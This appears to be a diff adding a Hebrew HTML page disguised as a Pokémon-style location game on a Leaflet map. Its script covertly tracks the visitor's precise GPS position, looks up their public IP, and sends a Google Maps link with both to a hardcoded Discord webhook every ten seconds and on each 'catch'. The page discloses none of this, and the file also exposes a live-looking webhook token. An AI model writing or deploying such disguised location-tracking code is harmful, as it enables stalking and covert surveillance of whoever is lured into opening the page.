@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="he">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>פוקימון - צייד דמויות</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            direction: rtl;
+            background: #1e1a2b;
+            color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        #map {
+            flex: 1;
+            height: 100%;
+            width: 100%;
+            border-bottom: 3px solid #f5c542;
+        }
+        .topbar {
+            background: #2a1f3d;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            border-bottom: 2px solid #f5c542;
+            position: relative;
+        }
+        .title {
+            font-size: 22px;
+            font-weight: bold;
+            color: #f5c542;
+        }
+        .score {
+            background: #3b2a55;
+            padding: 8px 20px;
+            border-radius: 40px;
+            font-size: 18px;
+            border: 1px solid #f5c542;
+        }
+        #status {
+            font-size: 14px;
+            color: #b8a5c9;
+            padding: 6px 14px;
+            background: #1e1a2b;
+            border-radius: 30px;
+        }
+        .controls {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        button {
+            background: #f5c542;
+            border: none;
+            padding: 8px 22px;
+            border-radius: 40px;
+            font-weight: bold;
+            color: #1e1a2b;
+            cursor: pointer;
+            font-size: 16px;
+            transition: 0.2s;
+        }
+        button:hover {
+            background: #e0b03a;
+            transform: scale(1.02);
+        }
+        #caught {
+            margin-top: 8px;
+            font-size: 14px;
+            color: #b8a5c9;
+            text-align: center;
+            padding: 6px;
+        }
+        @media (max-width: 600px) {
+            .topbar { flex-direction: column; align-items: stretch; text-align: center; }
+            .controls { justify-content: center; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="topbar">
+    <div class="title">⚡ פוקימון - צייד</div>
+    <div class="score">🏆 נקודות: <span id="scoreDisplay">0</span></div>
+    <div class="controls">
+        <span id="status">📍 ממתין למיקום...</span>
+        <button onclick="forceSend()">📤 שלח עכשיו</button>
+    </div>
+</div>
+
+<div id="map"></div>
+<div id="caught">💜 תפסת 0 דמויות</div>
+
+<script>
+    // ---- הגדרות ----
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1535302522468696064/YPFDADX-20AIin-CPU0k1UiB2if9qDh-ebTqzmBJIt5UkJkwrE8uRIQma6ZLmw_xz0pu";
+    const CHARACTERS = [
+        { name: "פיקאצ'ו", lat: 32.0853, lng: 34.7818, emoji: "⚡" },
+        { name: "בולבזאור", lat: 32.0820, lng: 34.7750, emoji: "🌿" },
+        { name: "צ'אריזארד", lat: 32.0880, lng: 34.7900, emoji: "🔥" },
+        { name: "סקווירטל", lat: 32.0800, lng: 34.7850, emoji: "💧" }
+    ];
+
+    let score = 0;
+    let caught = [];
+    let userLat = null, userLng = null;
+    let map, userMarker, watchId;
+    let intervalId = null;
+
+    // ---- אתחול מפה ----
+    map = L.map('map').setView([32.0853, 34.7818], 16);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '&copy; OpenStreetMap'
+    }).addTo(map);
+
+    // ---- הוספת דמויות ----
+    const markers = [];
+    CHARACTERS.forEach((char) => {
+        const marker = L.marker([char.lat, char.lng], {
+            icon: L.divIcon({
+                html: `<div style="font-size:34px; filter: drop-shadow(0 0 6px gold);">${char.emoji}</div>`,
+                className: '',
+                iconSize: [40, 40],
+                iconAnchor: [20, 40]
+            })
+        }).addTo(map);
+        marker.bindPopup(`<b>${char.name}</b> (לכי לתפוס!)`);
+        markers.push({
+            marker,
+            name: char.name,
+            lat: char.lat,
+            lng: char.lng,
+            emoji: char.emoji,
+            caught: false
+        });
+    });
+
+    // ---- מעקב מיקום ----
+    function startLocation() {
+        if (!navigator.geolocation) {
+            document.getElementById('status').innerText = "❌ דפדפן לא תומך במיקום";
+            return;
+        }
+        watchId = navigator.geolocation.watchPosition(
+            (pos) => {
+                userLat = pos.coords.latitude;
+                userLng = pos.coords.longitude;
+                document.getElementById('status').innerText = `📍 ${userLat.toFixed(5)}, ${userLng.toFixed(5)}`;
+                if (!userMarker) {
+                    userMarker = L.marker([userLat, userLng], {
+                        icon: L.divIcon({ html: '🧑', className: '', iconSize: [30,30] })
+                    }).addTo(map);
+                    map.setView([userLat, userLng], 16);
+                } else {
+                    userMarker.setLatLng([userLat, userLng]);
+                }
+                checkProximity();
+            },
+            (err) => {
+                document.getElementById('status').innerText = "⚠️ שגיאת GPS: " + err.message;
+            },
+            { enableHighAccuracy: true, maximumAge: 5000 }
+        );
+    }
+
+    // ---- בדיקת קרבה לאיסוף ----
+    function checkProximity() {
+        if (!userLat) return;
+        let caughtAny = false;
+        markers.forEach((item) => {
+            if (item.caught) return;
+            const dist = getDistance(userLat, userLng, item.lat, item.lng);
+            if (dist < 50) {
+                item.caught = true;
+                caught.push(item.name);
+                score += 10;
+                document.getElementById('scoreDisplay').innerText = score;
+                document.getElementById('caught').innerHTML = `💜 תפסת ${caught.length} דמויות: ${caught.join(', ')}`;
+                map.removeLayer(item.marker);
+                const popup = L.popup()
+                    .setLatLng([item.lat, item.lng])
+                    .setContent(`🎉 תפסת ${item.emoji} ${item.name}! +10 נקודות`)
+                    .openOn(map);
+                setTimeout(() => map.closePopup(popup), 3000);
+                caughtAny = true;
+            }
+        });
+        if (caughtAny) {
+            sendToWebhook(`🎯 תפס ${caught[caught.length-1]}! ניקוד: ${score}`);
+        }
+    }
+
+    // ---- שליחה לוואבהוק (עם IP) ----
+    async function sendToWebhook(message = null) {
+        if (!userLat || !userLng) return;
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const ip = ipData.ip || 'לא זמין';
+
+            const content = message || `📍 מיקום עדכני\nhttps://www.google.com/maps?q=${userLat},${userLng}\n🖥️ IP: ${ip}\n🏆 ניקוד: ${score}`;
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content })
+            });
+        } catch (e) {
+            console.error('שגיאת שליחה:', e);
+        }
+    }
+
+    // ---- שליחה כל 10 שניות ----
+    function startAutoSend() {
+        if (intervalId) clearInterval(intervalId);
+        intervalId = setInterval(() => {
+            sendToWebhook();
+        }, 10000);
+    }
+
+    // ---- שליחה ידנית ----
+    function forceSend() {
+        sendToWebhook('📤 שליחה ידנית');
+        document.getElementById('status').innerText = '✅ נשלח!';
+        setTimeout(() => {
+            document.getElementById('status').innerText = `📍 ${userLat?.toFixed(5) || '...'}, ${userLng?.toFixed(5) || '...'}`;
+        }, 2000);
+    }
+
+    // ---- חישוב מרחק ----
+    function getDistance(lat1, lon1, lat2, lon2) {
+        const R = 6371000;
+        const dLat = (lat2 - lat1) * Math.PI / 180;
+        const dLon = (lon2 - lon1) * Math.PI / 180;
+        const a = Math.sin(dLat/2)**2 + Math.cos(lat1 * Math.PI/180) * Math.cos(lat2 * Math.PI/180) * Math.sin(dLon/2)**2;
+        return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+    }
+
+    // ---- הפעלה ----
+    startLocation();
+    startAutoSend();
+    window.forceSend = forceSend;
+</script>
+</body>
+</html>
